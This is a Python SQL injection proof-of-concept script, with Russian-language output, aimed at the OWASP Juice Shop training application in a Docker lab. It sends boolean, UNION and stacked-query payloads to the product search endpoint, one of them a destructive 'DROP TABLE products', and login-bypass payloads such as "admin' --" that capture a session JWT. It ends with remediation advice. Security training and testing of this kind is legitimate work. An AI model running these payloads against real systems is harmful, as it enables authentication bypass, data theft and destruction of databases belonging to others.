#!/usr/bin/env python3
"""
SQL Injection (CWE-89) PoC для OWASP Juice Shop
Целевой эндпоинт: /rest/products/search
Уязвимость:  Пользовательский ввод попадает в SQL без экранирования через Sequelize ORM
"""

import requests
import sys
import json
from colorama import Fore, Style, init

init(autoreset=True)

TARGET = "http://juice-shop:3000"
SEARCH_ENDPOINT = f"{TARGET}/rest/products/search"

def print_header():
    """Печать заголовка"""
    print(f"\n{Fore.CYAN}{'='*80}")
    print(f"{Fore.CYAN}SQL Injection (CWE-89) PoC для OWASP Juice Shop")
    print(f"{Fore.CYAN}{'='*80}")
    print(f"\n{Fore.YELLOW}Целевой эндпоинт: {SEARCH_ENDPOINT}")
    print(f"{Fore.YELLOW}Окружение: Docker Virtual Environment (Attacker Container)")
    print(f"{Fore.YELLOW}Дата запуска: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

def check_service_health():
    """Проверка доступности Juice Shop"""
    print(f"\n{Fore. CYAN}[*] Проверка доступности Juice Shop...")
    try:
        response = requests.get(f"{TARGET}/", timeout=5)
        if response.status_code == 200:
            print(f"{Fore.GREEN}✓ Juice Shop доступен и работает!")
            return True
    except Exception as e:
        print(f"{Fore.RED}✗ Ошибка подключения: {e}")
        print(f"{Fore.RED}Убедитесь, что Juice Shop запущен:  docker compose up -d juice-shop")
        return False

def test_normal_search():
    """Базовый поиск без инъекции (для сравнения)"""
    print(f"\n{Fore. YELLOW}[1] Базовый поиск (без SQL инъекции) - BASELINE")
    print(f"{Fore.YELLOW}{'-'*80}")
    
    try:
        params = {"q": "Juice"}
        response = requests.get(SEARCH_ENDPOINT, params=params, timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            products = data.get('data', [])
            baseline_count = len(products)
            
            print(f"Запрос:  GET {SEARCH_ENDPOINT}?q=Juice")
            print(f"HTTP Status: {response.status_code}")
            print(f"Найдено продуктов: {baseline_count}")
            
            if products:
                print(f"\nПримеры найденных продуктов:")
                for product in products[:3]: 
                    print(f"  - {product. get('name', 'Unknown')}")
            
            return baseline_count
        else:
            print(f"{Fore.RED}Ошибка: HTTP {response.status_code}")
            return 0
    
    except Exception as e:
        print(f"{Fore.RED}Ошибка при запросе: {e}")
        return 0

def test_sqli_payloads(baseline_count):
    """Тестирование SQL Injection payloads"""
    print(f"\n{Fore.YELLOW}[2] Тестирование SQL Injection Payloads")
    print(f"{Fore.YELLOW}{'-'*80}")
    
    payloads = [
        {
            "payload": "' OR '1'='1",
            "description": "Классический SQLi - OR условие всегда true",
            "type": "Boolean-based"
        },
        {
            "payload": "' OR 1=1 --",
            "description": "SQLi с комментарием SQL (--)",
            "type": "Boolean-based"
        },
        {
            "payload": "' UNION ALL SELECT 1,2,3,4,5 --",
            "description": "UNION-based SQL Injection",
            "type": "UNION-based"
        },
        {
            "payload": "'; DROP TABLE products; --",
            "description":  "Попытка деструктивной инъекции",
            "type": "Stacked Queries"
        },
    ]
    
    vulnerabilities_found = []
    
    for i, payload_info in enumerate(payloads, 1):
        payload = payload_info["payload"]
        description = payload_info["description"]
        payload_type = payload_info["type"]
        
        print(f"\n{Fore.MAGENTA}[Payload {i}] {payload_type}")
        print(f"{Fore.MAGENTA}Описание: {description}")
        print(f"{Fore.MAGENTA}Payload: {payload}")
        
        try:
            params = {"q": payload}
            response = requests.get(SEARCH_ENDPOINT, params=params, timeout=5)
            
            print(f"HTTP Status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                products = data.get('data', [])
                sqli_count = len(products)
                
                print(f"Вернулось продуктов: {sqli_count}")
                
                # Анализ результатов
                if sqli_count > baseline_count:
                    print(f"{Fore.GREEN}[!!! ] SQL INJECTION РАБОТАЕТ!")
                    print(f"{Fore.GREEN}Получено на {sqli_count - baseline_count} больше результатов чем обычно")
                    
                    if products:
                        print(f"\nПримеры полученных продуктов:")
                        for product in products[:3]:
                            print(f"  - {product.get('name', 'Unknown')}")
                    
                    vulnerabilities_found.append({
                        "payload": payload,
                        "type": payload_type,
                        "results": sqli_count,
                        "exploitable": True
                    })
                elif sqli_count == baseline_count:
                    print(f"{Fore.YELLOW}(Результат совпадает с baseline - может быть защита)")
                else:
                    print(f"{Fore. YELLOW}(Меньше результатов - фильтр может быть активен)")
            
            elif response.status_code == 400 or response.status_code == 500:
                print(f"{Fore. YELLOW}[! ] Ошибка сервера - возможна уязвимость")
                print(f"Ответ: {response.text[: 200]}")
        
        except requests.exceptions. Timeout:
            print(f"{Fore.RED}[!] Timeout - возможна длительная операция БД")
        
        except Exception as e:
            print(f"{Fore.RED}Ошибка: {e}")
    
    return vulnerabilities_found

def test_sqli_login():
    """Дополнительный тест - SQL Injection в логине"""
    print(f"\n{Fore.YELLOW}[3] Тестирование SQL Injection в эндпоинте логина")
    print(f"{Fore.YELLOW}{'-'*80}")
    
    login_endpoint = f"{TARGET}/rest/user/login"
    
    login_payloads = [
        {
            "email": "admin' --",
            "password": "anything",
            "description": "Обход пароля через комментарий"
        },
        {
            "email": "' OR '1'='1",
            "password": "' OR '1'='1",
            "description": "OR условие в обоих полях"
        },
    ]
    
    print(f"Целевой эндпоинт: POST {login_endpoint}\n")
    
    for i, payload_info in enumerate(login_payloads, 1):
        email = payload_info["email"]
        password = payload_info["password"]
        description = payload_info["description"]
        
        print(f"{Fore.MAGENTA}[Попытка {i}] {description}")
        print(f"Email: {email}")
        print(f"Password: {password}")
        
        try:
            data = {"email": email, "password": password}
            response = requests.post(login_endpoint, json=data, timeout=5)
            
            print(f"HTTP Status: {response.status_code}")
            
            if response.status_code == 200:
                resp_data = response.json()
                if resp_data.get('authentication'):
                    print(f"{Fore.GREEN}[!!!] SQL INJECTION В ЛОГИНЕ РАБОТАЕТ!")
                    print(f"{Fore.GREEN}Получен JWT токен: {resp_data. get('authentication')[: 50]}...")
                    return True
                else:
                    print(f"Ответ: {json.dumps(resp_data, indent=2)[:300]}")
            
            print()
        
        except Exception as e:
            print(f"Ошибка: {e}\n")
    
    return False

def generate_report(vulnerabilities_found):
    """Генерация отчёта"""
    print(f"\n{Fore. CYAN}{'='*80}")
    print(f"{Fore.CYAN}ИТОГОВЫЙ ОТЧЁТ")
    print(f"{Fore.CYAN}{'='*80}\n")
    
    if vulnerabilities_found:
        print(f"{Fore.GREEN}[+] SQL INJECTION (CWE-89) ПОДТВЕРЖДЕНА!")
        print(f"{Fore.GREEN}[+] Уязвимость:  ВЫСОКОГО РИСКА (CRITICAL)\n")
        
        print(f"Найденные векторы атак:")
        for vuln in vulnerabilities_found:
            print(f"  ✓ {vuln['type']}")
            print(f"    Payload: {vuln['payload']}")
            print(f"    Результаты: {vuln['results']} продуктов\n")
        
        print(f"{Fore.YELLOW}Рекомендации по исправлению:")
        print(f"  1. Использовать параметризованные запросы (Prepared Statements)")
        print(f"  2. Применить ORM-методы безопасно (Sequelize)")
        print(f"  3. Валидировать входные данные на серверной стороне")
        print(f"  4. Использовать WAF (Web Application Firewall)")
        print(f"\nДокументация:")
        print(f"  - Sequelize Safe Queries: https://sequelize.org/docs/v6/core-concepts/raw-queries/#replacements")
        print(f"  - OWASP SQL Injection:  https://owasp.org/www-community/attacks/SQL_Injection")
    
    else:
        print(f"{Fore. YELLOW}[-] SQL Injection явно не обнаружена на этом эндпоинте")
        print(f"{Fore.YELLOW}Может быть применена частичная защита или версия без уязвимости\n")
    
    print(f"{Fore.CYAN}{'='*80}\n")

def main():
    """Главная функция"""
    print_header()
    
    # Проверка доступности сервиса
    if not check_service_health():
        sys.exit(1)
    
    # Базовый поиск
    baseline = test_normal_search()
    
    # Тестирование SQL Injection payloads
    vulnerabilities = test_sqli_payloads(baseline)
    
    # Тест логина
    test_sqli_login()
    
    # Отчёт
    generate_report(vulnerabilities)

if __name__ == "__main__":
    main()